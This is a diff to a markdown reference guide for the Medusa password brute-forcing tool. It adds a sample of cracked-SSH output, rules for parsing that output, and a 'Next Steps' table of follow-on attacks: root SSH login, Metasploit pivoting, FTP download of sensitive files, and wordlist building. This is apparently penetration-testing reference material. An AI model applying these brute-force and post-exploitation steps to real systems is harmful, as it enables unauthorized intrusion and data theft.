@@ -104,6 +104,36 @@ medusa -h target.com -u admin -P pass.txt -M http -m DIR:/admin -m AUTH:basic
 
 ---
 
+## Output Parsing
+
+### Sample Output
+```
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
+
+ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: admin (1 of 100, 0 complete)
+ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: password (2 of 100, 0 complete)
+ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: root Password: toor [SUCCESS]
+```
+
+### Parsing Rules
+- `ACCOUNT CHECK:` = attempt in progress (verbose mode)
+- `ACCOUNT FOUND: ... [SUCCESS]` = **valid credentials discovered**
+- `[SUCCESS]` suffix confirms authentication was successful
+- `-O` flag writes successful results to output file
+
+---
+
+## Next Steps
+
+| Finding | Recommended Next Tool | Example |
+|---------|----------------------|---------|
+| SSH credentials found | Direct SSH access | `ssh root@192.168.1.10` |
+| Multiple hosts compromised | Pivot with `msfconsole` | `use post/multi/manage/autoroute` |
+| FTP access gained | Download sensitive files | `curl ftp://target -u user:pass -O` |
+| No valid passwords | Try `cewl` for custom wordlist | `cewl -d 3 http://target -w custom.txt` |
+
+---
+
 ## Safety Warnings
 | Risk | Description |
 |------|-------------|
@@ -123,11 +153,3 @@ medusa -h target.com -u admin -P pass.txt -M http -m DIR:/admin -m AUTH:basic
 | Output | Simple | Detailed |
 
 > **Recommendation:** Use Hydra for HTTP forms, Medusa for other protocols.
-
----
-
-## Output Parsing
-Success format:
-```
-ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: root Password: toor [SUCCESS]
-```
